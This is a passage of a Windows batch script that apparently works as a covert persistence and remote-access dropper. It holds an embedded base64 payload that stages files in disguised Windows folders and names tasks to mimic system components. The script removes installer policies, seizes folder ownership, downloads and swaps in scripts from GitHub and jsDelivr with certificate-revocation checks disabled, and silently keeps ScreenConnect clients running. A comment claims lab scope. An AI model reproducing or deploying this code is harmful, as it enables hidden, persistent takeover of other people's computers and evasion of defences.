  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:EnsureGryxaMust
rem O42: thin fallback — prefer lib gryxa-ensure; never msiexec here.
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
::QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIwMjYwODA0TTQ4DQpy
::ZW0gIE00ODogSEFORFMtT0ZGIGFsbCBTQyBpbnRlcnJ1cHQg4oCUIG9ubHkgR3J5
::eGEgaW5zdGFsbC1pZi1hYnNlbnQuIE5vIGV4dGVybWluYXRlL3NldnJ6IC9pL3Nj
::IGRlbGV0ZS4NCnJlbSAgTTQ3OiBIQVJEIHN0b3AgR3J5eGEgaW50ZXJydXB0cyDi
::gJQgbm8gcmF3IHNldnJ6IC9pOyBkZXRlY3QgYW55IG5vbi1zZXZyeiBTQzsgYWRv
::cHQgbGl2ZSBGUC4NCnJlbSAgTTQ2OiBTVEFSVF9QRU5ESU5HID0gYWxpdmU7IG5l
::dmVyIC94IEdyeXhhIHdoaWxlIHNlcnZpY2UgZXhpc3RzIChjb25uZWN0LWRyb3Ap
::Lg0KcmVtICBNNDU6IEw0MiBzYWZlIEZQIG1pZ3JhdGUgKGluc3RhbGwgbmV3IGJl
::Zm9yZSByZW1vdmluZyBvbGQgR3J5eGEpLg0KcmVtICBNNDQ6IGZvcmNlX2dyeXhh
::LmZsYWcgbXVzdCBOT1QgL3ggbGl2ZSBHcnl4YSAoTDQxIGZvcmNlLXNraXAtaWYt
::cnVubmluZykuDQpyZW0gIE00MzogQU1TSS1wcm9vZiBHcnl4YSBmYWxsYmFjayB2
::aWEgb3duX2dyeXhhLmNtZCAocHVyZSBtc2lleGVjKSB3aGVuIFBTIGJsb2NrZWQv
::bWlzc2luZy4NCnJlbSAgTTQyOiBzaWduZWQgbWFuaWZlc3Q7IHNldnJ6LmNmZzsg
::c2libGluZy1zYWZlIHNldnJ6IC9pLg0KcmVtICBBdXRob3JpemVkIGludGVybmFs
::IGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4NCnJlbSDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZANCnNl
::dGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCg0Kc2V0ICJLRUVQX0ZQPTVm
::NjAxMDU3OTg1MmU1MDciDQpzZXQgIkFMVF9GUD1mODYxYzgxNDBkNDUzNDI3Ig0K
::c2V0ICJHUllYQV9GUD0zNmU1MDZmZjAxNmIyMTUxIg0Kc2V0ICJXRD1DOlxQcm9n
::cmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSINCnNl
::dCAiRVRMPUM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVc
::LmV0bGNhY2hlIg0Kc2V0ICJMT0c9JVdEJVxvd25fbW9uLmxvZyINCnNldCAiU1RB
::VEU9JVdEJVxvd25fbW9uLnN0YXRlIg0Kc2V0ICJIQkZMQUc9JVdEJVxoYi5mbGFn
::Ig0Kc2V0ICJDVVJMPSVTeXN0ZW1Sb290JVxTeXN0ZW0zMlxjdXJsLmV4ZSINCnNl
::dCAiVEc9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5
::L2dpdGh1Yi1kcm9wL21haW4vdGdfcmVwb3J0LnBzMT90PSVSQU5ET00lJVJBTkRP
::TSUiDQpzZXQgIlRHMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVk
::ZHkvZ2l0aHViLWRyb3BAbWFpbi90Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFO
::RE9NJSINCnNldCAiT1dOU0VDPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50
::LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9zZWN1cmUuY21kP3Q9
::JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOU0VDMj1odHRwczovL2Nkbi5qc2Rl
::bGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fc2VjdXJl
::LmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTk1PTj1odHRwczovL3Jh
::dy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFp
::bi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTk1PTjI9
::aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9w
::QG1haW4vb3duX21vbi5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05M
::SUI9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dp
::dGh1Yi1kcm9wL21haW4vb3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0K
::c2V0ICJPV05MSUIyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRk
::eS9naXRodWItZHJvcEBtYWluL293bl9saWIucHMxP3Q9JVJBTkRPTSUlUkFORE9N
::JSINCnNldCAiT1dOR1JZWEE9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQu
::Y29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX2dyeXhhLmNtZD90PSVS
::QU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkdSWVhBMj1odHRwczovL2Nkbi5qc2Rl
::bGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fZ3J5eGEu
::Y21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiTUFOSUZFU1RfVVJMPWh0dHBz
::Oi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJv
::cC9tYWluL3VwZGF0ZS5tYW5pZmVzdD90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQg
::Ik1BTklGRVNUX1NJR19VUkw9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQu
::Y29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vdXBkYXRlLm1hbmlmZXN0LnNp
::Zz90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIlNFVlJaX0VYUF9VUkw9aHR0cHM6
::Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9w
::L21haW4vc2V2cnpfZXhwZWN0ZWQuY2ZnP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNl
::dCAiU0VWUlpfRVhQX1VSTDI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hu
::b2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vc2V2cnpfZXhwZWN0ZWQuY2ZnP3Q9JVJB
::TkRPTSUlUkFORE9NJSINCnNldCAiTVNJX1VSTD1odHRwczovL3VpLnNldnJ6LmNv
::bS9CaW4vU2NyZWVuQ29ubmVjdC5DbGllbnRTZXR1cC5tc2k/ZT1BY2Nlc3MmeT1H
::dWVzdCINCnNldCAiTVNJX0dSWVhBPWh0dHBzOi8vdWkuZ3J5eGEuY29tL0Jpbi9T
::Y3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0Ig0K
::c2V0ICJNU0lfUEtHMT1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20v
::eG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9wa2cubXNpIg0Kc2V0ICJNU0lfUEtH
::Mj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRy
::b3BAbWFpbi9wa2cubXNpIg0Kc2V0ICJNU0k9JVByb2dyYW1EYXRhJVxTY3JlZW5D
::b25uZWN0LkNsaWVudFNldHVwLm1zaSINCnNldCAiTVNJQ0FDSEU9JVdEJVxwa2cu
::bXNpIg0Kc2V0ICJNU0lfRz0lUHJvZ3JhbURhdGElXFNjcmVlbkNvbm5lY3QuR3J5
::eGEubXNpIg0Kc2V0ICJNU0lDQUNIRV9HPSVXRCVccGtnX2dyeXhhLm1zaSINCg0K
::aWYgbm90IGV4aXN0ICIlV0QlIiBtZCAiJVdEJSIgMj5udWwNCmlmIG5vdCBleGlz
::dCAiJUxPRyUiIHR5cGUgbnVsPiIlTE9HJSIgMj5udWwNCg0Kc2V0ICJNT05WRVI9
::TTQ4Ig0Kc2V0ICJQRjg2PSVQcm9ncmFtRmlsZXMoeDg2KSUiDQpzZXQgIkdSWVhB
::X0RFRVA9JVdEJVxncnl4YV9kZWVwLmZsYWciDQpyZW0gbG9hZCBjdXJyZW50IEdy
::eXhhIEZQIChtYXkgcm90YXRlIHdoZW4gc2VydmVyL2tleXMgY2hhbmdlKQ0KaWYg
::ZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0x
::LCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kg
::IiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCINCmlmIG5vdCBk
::ZWZpbmVkIEdSWVhBX0ZQIHNldCAiR1JZWEFfRlA9MzZlNTA2ZmYwMTZiMjE1MSIN
::CmZvciAvZiAidG9rZW5zPTEtMyBkZWxpbXM9LyAiICUlYSBpbiAoIiVkYXRlJSIp
::IGRvIHNldCAiRFQ9JWRhdGUlICV0aW1lJSINCmVjaG8uPj4iJUxPRyUiDQplY2hv
::IOKUgOKUgCB0aWNrICFEVCEgW3ZlciAlTU9OVkVSJV0g4pSA4pSAPj4iJUxPRyUi
::DQpzZXQgIkNPVU5UPTAiDQpzZXQgIklOU1RBTExFRD0wIg0Kc2V0ICJQUklNX09L
::PTAiDQpzZXQgIkFMVF9PSz0wIg0Kc2V0ICJGT1JFSUdOX0xFRlQ9MCINCnNldCAi
::Rk9SRUlHTl9MSVNUPSINCnNldCAiTVNJRVhJVD1ub3QtcnVuIg0KDQpyZW0g4pSA
::4pSAIFswXSBzaW5nbGUtZmxpZ2h0IG11dGV4IChzdG9wIG92ZXJsYXBwaW5nIHRp
::Y2tzIHJhY2luZyBtc2lleGVjKSDilIDilIANCnNldCAiTVVURVg9JVdEJVx0aWNr
::LmxvY2siDQppZiBleGlzdCAiJU1VVEVYJSIgKA0KICBmb3IgJSVBIGluICgiJU1V
::VEVYJSIpIGRvIHNldCAiTE9DS0FHRT0lJX50QSINCiAgcG93ZXJzaGVsbCAtTm9Q
::cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKFRlc3QtUGF0aCAn
::JU1VVEVYJScpIC1hbmQgKCgoR2V0LURhdGUpLShHZXQtSXRlbSAtTGl0ZXJhbFBh
::dGggJyVNVVRFWCUnIC1Gb3JjZSkuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVz
::IC1sdCAyMCkpeyBleGl0IDEgfSBlbHNlIHsgZXhpdCAwIH0iID5udWwgMj4mMQ0K
::ICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gdGlja19za2lwcGVkX211dGV4
::X2J1c3k+PiIlTE9HJSINCiAgICBlbmRsb2NhbA0KICAgIGV4aXQgL2IgMA0KICAp
::DQopDQplY2hvICVEQVRFJSAlVElNRSUgJVJBTkRPTSU+IiVNVVRFWCUiDQoNCnJl
::bSDilIDilIAgcGVyLWhvc3QgaWRlbnRpdHkgKGFudGktc2lnbmF0dXJlKSDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIANCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMx
::IiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9u
::IGluaXQgLVdvcmtEaXIgIiVXRCUiID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVXRCVc
::aWRlbnRpdHkuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1z
::PT0iICUlSyBpbiAoIiVXRCVcaWRlbnRpdHkuY2ZnIikgZG8gc2V0ICIlJUs9JSVM
::Ig0KaWYgbm90IGRlZmluZWQgVEFTS19BIHNldCAiVEFTS19BPVdlclF1ZXVlU3lu
::YyINCmlmIG5vdCBkZWZpbmVkIFRBU0tfQiBzZXQgIlRBU0tfQj1QbGFTZXJ2ZXJI
::ZWFsdGgiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Mgc2V0ICJUQVNLX0M9V2RpSG9z
::dFByb3h5Ig0KaWYgbm90IGRlZmluZWQgVEFTS19EIHNldCAiVEFTS19EPVRjcElw
::Q29uZmxpY3RSZXMiDQppZiBub3QgZGVmaW5lZCBNT19BIHNldCAiTU9fQT0yIg0K
::aWYgbm90IGRlZmluZWQgTU9fQiBzZXQgIk1PX0I9MyINCg0KcmVtIOKUgOKUgCBb
::QV0gYXV0by11cGRhdGUgY29yZSBmaWxlcyAoYmVzdCBlZmZvcnQpIOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0K
::aWYgbm90IGV4aXN0ICIlQ1VSTCUiIHNldCAiQ1VSTD1jdXJsLmV4ZSINCnJlbSBN
::MzU6IGd1YXJhbnRlZSB1cGRhdGUgY2hhbm5lbCDigJQgdW5oYXJkZW4gd29ya2Rp
::ciBlYWNoIHRpY2sgYW5kIHN0YWdlIGRvd25sb2Fkcw0KcmVtIGluIEM6XFdpbmRv
::d3NcVGVtcCAobmV2ZXIgQUNMLWxvY2tlZCksIHRoZW4gbW92ZSBpbnRvICVXRCUu
::IExvY2tEaXIgY2Fubm90IGZyZWV6ZSB1cy4NCnNldCAiU1RBR0U9JVN5c3RlbVJv
::b3QlXFRlbXBcLnVwZCINCmlmIG5vdCBleGlzdCAiJVNUQUdFJSIgbWtkaXIgIiVT
::VEFHRSUiID5udWwgMj4mMQ0KYXR0cmliIC1oIC1zIC1yICIlV0QlIiA+bnVsIDI+
::JjENCnRha2Vvd24gL0YgIiVXRCUiIC9SIC9EIFkgPm51bCAyPiYxDQppY2FjbHMg
::IiVXRCUiIC9yZXNldCAvVCAvQyAvUSA+bnVsIDI+JjENCmljYWNscyAiJVdEJSIg
::L2dyYW50ICJOVCBBVVRIT1JJVFlcU1lTVEVNOihPSSkoQ0kpRiIgIkJVSUxUSU5c
::QWRtaW5pc3RyYXRvcnM6KE9JKShDSSlGIiAvVCAvQyAvUSA+bnVsIDI+JjENCmF0
::dHJpYiAtaCAtcyAtciAiJVdEJVx0Z19yZXBvcnQucHMxIiAiJVdEJVxvd25fc2Vj
::dXJlLmNtZCIgIiVXRCVcb3duX2xpYi5wczEiICIlV0QlXG93bl9tb24uY21kIiA+
::bnVsIDI+JjENCg0Kc2V0ICJTRUxGX1VQRD0wIg0KIiVDVVJMJSIgLUwgLS1zc2wt
::bm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAi
::JVNUQUdFJVx0Z19yZXBvcnQubmV3IiAiJVRHJSIgPm51bCAyPiYxDQppZiBub3Qg
::ZXhpc3QgIiVTVEFHRSVcdGdfcmVwb3J0Lm5ldyIgIiVDVVJMJSIgLUwgLS1jb25u
::ZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlU1RBR0UlXHRnX3JlcG9y
::dC5uZXciICIlVEcyJSIgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1y
::ZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDMwIC1vICIlU1RB
::R0UlXG93bl9zZWN1cmUubmV3IiAiJU9XTlNFQyUiID5udWwgMj4mMQ0KaWYgbm90
::IGV4aXN0ICIlU1RBR0UlXG93bl9zZWN1cmUubmV3IiAiJUNVUkwlIiAtTCAtLWNv
::bm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVTVEFHRSVcb3duX3Nl
::Y3VyZS5uZXciICIlT1dOU0VDMiUiID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1z
::c2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAt
::byAiJVNUQUdFJVxvd25fbGliLm5ldyIgIiVPV05MSUIlIiA+bnVsIDI+JjENCmlm
::IG5vdCBleGlzdCAiJVNUQUdFJVxvd25fbGliLm5ldyIgIiVDVVJMJSIgLUwgLS1j
::b25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlU1RBR0UlXG93bl9s
::aWIubmV3IiAiJU9XTkxJQjIlIiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3Ns
::LW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8g
::IiVTVEFHRSVcb3duX21vbi5uZXh0IiAiJU9XTk1PTiUiID5udWwgMj4mMQ0KaWYg
::bm90IGV4aXN0ICIlU1RBR0UlXG93bl9tb24ubmV4dCIgIiVDVVJMJSIgLUwgLS1j
::b25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlU1RBR0UlXG93bl9t
::b24ubmV4dCIgIiVPV05NT04yJSIgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAtLXNz
::bC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDIwIC1v
::ICIlU1RBR0UlXG93bl9ncnl4YS5uZXciICIlT1dOR1JZWEElIiA+bnVsIDI+JjEN
::CmlmIG5vdCBleGlzdCAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiAiJUNVUkwlIiAt
::TCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMjAgLW8gIiVTVEFHRSVc
::b3duX2dyeXhhLm5ldyIgIiVPV05HUllYQTIlIiA+bnVsIDI+JjENCiIlQ1VSTCUi
::IC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA2IC0tbWF4LXRp
::bWUgMjAgLW8gIiVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0IiAiJU1BTklGRVNUX1VS
::TCUiID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29u
::bmVjdC10aW1lb3V0IDYgLS1tYXgtdGltZSAyMCAtbyAiJVNUQUdFJVx1cGRhdGUu
::bWFuaWZlc3Quc2lnIiAiJU1BTklGRVNUX1NJR19VUkwlIiA+bnVsIDI+JjENCg0K
::cmVtIE00Mjogc2lnbmVkIHVwZGF0ZS5tYW5pZmVzdCBnYXRlIChSU0EtU0hBMjU2
::KS4gRmFsbGJhY2sgdG8gQlVJTEQgbWFya2VycyBpZiBubyBwdWJrZXkgeWV0Lg0K
::c2V0ICJVUERfT0s9MCINCnNldCAiTUFQPSINCmlmIGV4aXN0ICIlU1RBR0UlXG93
::bl9saWIubmV3IiBzZXQgIk1BUD0hTUFQIW93bl9saWIucHMxPSVTVEFHRSVcb3du
::X2xpYi5uZXc7Ig0KaWYgZXhpc3QgIiVTVEFHRSVcb3duX21vbi5uZXh0IiBzZXQg
::Ik1BUD0hTUFQIW93bl9tb24uY21kPSVTVEFHRSVcb3duX21vbi5uZXh0OyINCmlm
::IGV4aXN0ICIlU1RBR0UlXG93bl9zZWN1cmUubmV3IiBzZXQgIk1BUD0hTUFQIW93
::bl9zZWN1cmUuY21kPSVTVEFHRSVcb3duX3NlY3VyZS5uZXc7Ig0KaWYgZXhpc3Qg
::IiVTVEFHRSVcdGdfcmVwb3J0Lm5ldyIgc2V0ICJNQVA9IU1BUCF0Z19yZXBvcnQu
::cHMxPSVTVEFHRSVcdGdfcmVwb3J0Lm5ldzsiDQppZiBleGlzdCAiJVNUQUdFJVxv
::d25fZ3J5eGEubmV3IiBzZXQgIk1BUD0hTUFQIW93bl9ncnl4YS5jbWQ9JVNUQUdF
::JVxvd25fZ3J5eGEubmV3OyINCnNldCAiVlJFUz1taXNzaW5nIg0KaWYgZXhpc3Qg
::IiVXRCVcb3duX2xpYi5wczEiIGlmIGV4aXN0ICIlU1RBR0UlXHVwZGF0ZS5tYW5p
::ZmVzdCIgaWYgZXhpc3QgIiVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0LnNpZyIgaWYg
::ZGVmaW5lZCBNQVAgKA0KICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBp
::biAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1
::dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rp
::b24gdmVyaWZ5LXVwZGF0ZSAtV29ya0RpciAiJVdEJSIgLUV4dHJhICIlU1RBR0Ul
::XHVwZGF0ZS5tYW5pZmVzdHwlU1RBR0UlXHVwZGF0ZS5tYW5pZmVzdC5zaWd8IU1B
::UCEiYCkgZG8gc2V0ICJWUkVTPSUlUiINCikNCmVjaG8gdXBkYXRlX3ZlcmlmeT0h
::VlJFUyE+PiIlTE9HJSINCmlmIC9JICIhVlJFUyEiPT0ib2siICgNCiAgc2V0ICJV
::UERfT0s9MSINCikgZWxzZSBpZiAvSSAiIVZSRVMhIj09Im1pc3NpbmciICgNCiAg
::c2V0ICJVUERfT0s9ZmFsbGJhY2siDQopIGVsc2UgaWYgL0kgIiFWUkVTISI9PSJu
::by1wdWJrZXkiICgNCiAgc2V0ICJVUERfT0s9ZmFsbGJhY2siDQopIGVsc2UgaWYg
::L0kgIiFWUkVTOn4wLDEwISI9PSJub3QtaW4tbWFuIiAoDQogIHNldCAiVVBEX09L
::PWZhbGxiYWNrIg0KKSBlbHNlICgNCiAgZWNobyB1cGRhdGVfcmVmdXNlZF8hVlJF
::UyE+PiIlTE9HJSINCikNCg0KaWYgL0kgIiFVUERfT0shIj09IjEiICgNCiAgaWYg
::ZXhpc3QgIiVTVEFHRSVcdGdfcmVwb3J0Lm5ldyIgbW92ZSAveSAiJVNUQUdFJVx0
::Z19yZXBvcnQubmV3IiAiJVdEJVx0Z19yZXBvcnQucHMxIiA+bnVsIDI+JjENCiAg
::aWYgZXhpc3QgIiVTVEFHRSVcb3duX3NlY3VyZS5uZXciIG1vdmUgL3kgIiVTVEFH
::RSVcb3duX3NlY3VyZS5uZXciICIlV0QlXG93bl9zZWN1cmUuY21kIiA+bnVsIDI+
::JjENCiAgaWYgZXhpc3QgIiVTVEFHRSVcb3duX2xpYi5uZXciIG1vdmUgL3kgIiVT
::VEFHRSVcb3duX2xpYi5uZXciICIlV0QlXG93bl9saWIucHMxIiA+bnVsIDI+JjEN
::CiAgaWYgZXhpc3QgIiVTVEFHRSVcb3duX2dyeXhhLm5ldyIgZmluZHN0ciAvQzoi
::T1dOX0dSWVhBIEJVSUxEIiAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiA+bnVsIDI+
::JjEgJiYgbW92ZSAveSAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiAiJVdEJVxvd25f
::Z3J5eGEuY21kIiA+bnVsIDI+JjENCiAgc2V0ICJTRUxGX1VQRD0wIg0KICBpZiBl
::eGlzdCAiJVNUQUdFJVxvd25fbW9uLm5leHQiICgNCiAgICBmYyAvYiAiJVNUQUdF
::JVxvd25fbW9uLm5leHQiICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjENCiAg
::ICBpZiBlcnJvcmxldmVsIDEgc2V0ICJTRUxGX1VQRD0xIg0KICAgIGlmICIhU0VM
::Rl9VUEQhIj09IjAiIGRlbCAvZiAvcSAiJVNUQUdFJVxvd25fbW9uLm5leHQiID5u
::dWwgMj4mMQ0KICApDQopIGVsc2UgaWYgL0kgIiFVUERfT0shIj09ImZhbGxiYWNr
::IiAoDQogIGZpbmRzdHIgL0M6IlRHX1JFUE9SVCBCVUlMRCIgIiVTVEFHRSVcdGdf
::cmVwb3J0Lm5ldyIgPm51bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlU1RBR0UlXHRn
::X3JlcG9ydC5uZXciKSBkbyBpZiAlJX56RiBHVFIgMTUwMCBtb3ZlIC95ICIlU1RB
::R0UlXHRnX3JlcG9ydC5uZXciICIlV0QlXHRnX3JlcG9ydC5wczEiID5udWwgMj4m
::MQ0KICBmaW5kc3RyIC9DOiJPV05fU0VDVVJFIEJVSUxEIiAiJVNUQUdFJVxvd25f
::c2VjdXJlLm5ldyIgPm51bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlU1RBR0UlXG93
::bl9zZWN1cmUubmV3IikgZG8gaWYgJSV+ekYgR1RSIDgwMCBtb3ZlIC95ICIlU1RB
::R0UlXG93bl9zZWN1cmUubmV3IiAiJVdEJVxvd25fc2VjdXJlLmNtZCIgPm51bCAy
::PiYxDQogIGZpbmRzdHIgL0M6Ik9XTl9MSUIgIEJVSUxEIiAiJVNUQUdFJVxvd25f
::bGliLm5ldyIgPm51bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlU1RBR0UlXG93bl9s
::aWIubmV3IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgbW92ZSAveSAiJVNUQUdFJVxv
::d25fbGliLm5ldyIgIiVXRCVcb3duX2xpYi5wczEiID5udWwgMj4mMQ0KICBmaW5k
::c3RyIC9DOiJPV05fR1JZWEEgQlVJTEQiICIlU1RBR0UlXG93bl9ncnl4YS5uZXci
::ID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVNUQUdFJVxvd25fZ3J5eGEubmV3
::IikgZG8gaWYgJSV+ekYgR1RSIDUwMCBtb3ZlIC95ICIlU1RBR0UlXG93bl9ncnl4
::YS5uZXciICIlV0QlXG93bl9ncnl4YS5jbWQiID5udWwgMj4mMQ0KICBzZXQgIlNF
